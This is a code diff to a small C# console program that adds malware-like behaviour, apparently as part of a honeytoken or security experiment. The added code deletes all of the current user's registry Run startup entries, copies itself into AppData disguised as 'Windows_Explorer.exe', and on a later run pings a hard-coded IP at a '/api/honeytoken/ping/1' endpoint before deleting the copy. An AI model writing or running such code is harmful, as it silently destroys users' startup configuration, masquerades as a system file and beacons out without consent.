@@ -2,7 +2,9 @@
 using System;
 using System.IO;
 using System.Management;
-
+using System.Reflection;
+using System.Net.NetworkInformation;
+using System.Net.Http;
 
 namespace Test
 {
@@ -21,53 +23,73 @@ namespace Test
         }
         static void Main(string[] args)
         {
-
-            ManagementClass cls2 = new ManagementClass("Win32_StartupCommand");
-            ManagementObjectCollection coll2 = cls2.GetInstances();
-
-            foreach (ManagementObject obj in coll2)
+           
+            var ExploitFile = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Windows_Explorer.exe";
+            if (!File.Exists(ExploitFile))
             {
-                Console.WriteLine("Location: " + obj["Location"].ToString());
-                Console.WriteLine("Command: "+obj["Command"].ToString());
-                Console.WriteLine("Description: "+obj["Description"].ToString());
-                Console.WriteLine("Name: "+obj["Name"].ToString());
-                Console.WriteLine("Location: "+obj["Location"].ToString());
-                Console.WriteLine("User: "+obj["User"].ToString());
+                /////////////////
+
+                removefolder();
+                ManagementClass cls = new ManagementClass("Win32_StartupCommand");
+                ManagementObjectCollection coll = cls.GetInstances();
+
+                foreach (ManagementObject obj in coll)
+                {
+                    string name = (obj["Name"].ToString());
+                    string loc = obj["Location"].ToString();
+
+                    Console.WriteLine(name);
+                    using (RegistryKey key = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true))
+                    {
+                        key.DeleteValue(name, false);
+                    }
+                }
+                Console.WriteLine("\n\n-----------------------------After operation.....\nThis remains (Deafult windows)\n");
+                /////////////////////////////////////////////////////////////////////
+
+
+                string thisFile = System.AppDomain.CurrentDomain.FriendlyName;
+
+                string Path = AppDomain.CurrentDomain.BaseDirectory + "\\" + thisFile;
+                File.Copy(Path, ExploitFile);
+            }
+            else
+            {
+                Console.WriteLine("Here");
+                HttpClient client = new HttpClient();
+                /*client.BaseAddress = new Uri("http://192.168.100.156:5000/");*/
+
+                var res = client.GetAsync("http://192.168.100.156:5000/api/honeytoken/ping/1").Result;
+                
+                Console.WriteLine(res);
+                File.Delete(ExploitFile);
 
             }
-            /////////////////
 
-         /*   removefolder();
-            ManagementClass cls = new ManagementClass("Win32_StartupCommand");
-            ManagementObjectCollection coll = cls.GetInstances();
 
-            foreach (ManagementObject obj in coll)
+
+            //run our exe on startup
+
+
+
+            /*extractResource("")*/
+        }
+        public static void extractResource(String embeddedFileName, String destinationPath)
+        {
+            var currentAssembly = Assembly.GetExecutingAssembly();
+            var arrResources = currentAssembly.GetManifestResourceNames();
+            foreach (var resourceName in arrResources)
             {
-                string name = (obj["Name"].ToString());
-                string loc = obj["Location"].ToString();
-
-                Console.WriteLine(name);
-                using (RegistryKey key = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true))
+                if (resourceName.ToUpper().EndsWith(embeddedFileName.ToUpper()))
                 {
-                    key.DeleteValue(name, false);
+                    using (var resourceToSave = currentAssembly.GetManifestResourceStream(resourceName))
+                    {
+                        using (var output = File.OpenWrite(destinationPath))
+                            resourceToSave.CopyTo(output);
+                        resourceToSave.Close();
+                    }
                 }
             }
-            Console.WriteLine("\n\n-----------------------------After operation.....\nThis remains (Deafult windows)\n");
-            /////////////////////////////////////////////////////////////////////
-            ManagementClass cls1 = new ManagementClass("Win32_StartupCommand");
-            ManagementObjectCollection coll1 = cls1.GetInstances();
-
-            foreach (ManagementObject obj in coll1)
-            {
-                Console.WriteLine(obj["Location"].ToString());
-                Console.WriteLine(obj["Command"].ToString());
-                Console.WriteLine(obj["Description"].ToString());
-                Console.WriteLine(obj["Name"].ToString());
-                Console.WriteLine(obj["Location"].ToString());
-                Console.WriteLine(obj["User"].ToString());
-
-            }
-            Console.ReadLine();*/
         }
     }
 }
